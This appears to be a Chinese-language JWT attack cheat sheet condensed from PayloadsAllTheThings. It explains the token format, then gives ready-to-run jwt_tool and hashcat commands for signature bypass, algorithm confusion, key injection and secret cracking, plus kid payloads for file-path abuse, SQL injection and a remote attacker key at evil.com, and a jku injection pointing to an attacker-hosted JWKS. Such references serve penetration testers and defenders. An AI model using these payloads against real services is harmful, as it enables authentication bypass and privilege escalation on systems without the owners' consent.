# JWT - JSON Web Token

[SEARCH_KEYWORDS]
漏洞类型: JWT JSON Web Token Token Vulnerability
攻击类型: Authentication Bypass Privilege Escalation Signature Bypass
关键词: Base64 Header Payload Signature HS256 RS256 alg typ kid jku jwk
算法: HS256 HS384 HS512 RS256 RS384 RS512 ES256 ES384 ES512 none
CVE: CVE-2015-9235 CVE-2016-5431 CVE-2018-0114 CVE-2020-28042
工具: jwt_tool hashcat jwt-cracker

[CONTENT]

## JWT概述

JSON Web Token (JWT) 是一种开放标准(RFC 7519)，定义了一种紧凑且自包含的方式，用于在各方之间安全传输信息作为JSON对象。

## JWT格式

`Base64(Header).Base64(Payload).Base64(Signature)`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiYWRtaW4iOnRydWV9.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY
```

## Header参数

| 参数 | 说明 |
|------|------|
| alg | 算法 (HS256, RS256, none等) |
| typ | 类型 (通常为JWT) |
| kid | 密钥ID |
| jku | JWK Set URL |
| jwk | JSON Web Key |

## Payload Claims

| Claim | 说明 |
|-------|------|
| iss | 签发者 |
| sub | 主题 |
| aud | 受众 |
| exp | 过期时间 |
| iat | 签发时间 |
| nbf | 生效时间 |
| jti | JWT ID |

## 签名攻击

### Null签名攻击 (CVE-2020-28042)

发送无签名的JWT：

```powershell
python3 jwt_tool.py JWT_HERE -X n
```

### None算法攻击 (CVE-2015-9235)

修改alg为none：

```powershell
python3 jwt_tool.py JWT_HERE -X a
```

### 算法混淆攻击 (CVE-2016-5431)

RS256转HS256，使用公钥作为HMAC密钥：

```powershell
python3 jwt_tool.py JWT_HERE -X k -pk public.pem
```

### 密钥注入攻击 (CVE-2018-0114)

在header中注入jwk：

```powershell
python3 jwt_tool.py JWT_HERE -X i
```

## 密钥破解

### jwt_tool

```powershell
python3 jwt_tool.py JWT_HERE -d wordlist.txt -C
```

### Hashcat

```powershell
# 字典攻击
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# 暴力破解
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l
```

## kid滥用

### 本地文件

```json
{"alg": "HS256", "typ": "JWT", "kid": "/etc/passwd"}
```

### 远程文件

```json
{"alg": "RS256", "typ": "JWT", "kid": "http://evil.com/key"}
```

### SQL注入

```json
{"kid": "key' UNION SELECT 'secret'--"}
```

## jku注入

```powershell
python3 jwt_tool.py JWT_HERE -X s -ju http://evil.com/jwks.json
```

恶意JWKS:
```json
{
    "keys": [{
        "kid": "attacker-key",
        "kty": "RSA",
        "e": "AQAB",
        "n": "..."
    }]
}
```

## 工具

- jwt_tool - JWT测试工具包
- c-jwt-cracker - JWT暴力破解
- JOSEPH - Burp JWT插件
- jwt.io - 在线编码解码

## 参考文档

原始来源: PayloadsAllTheThings/JSON Web Token/README.md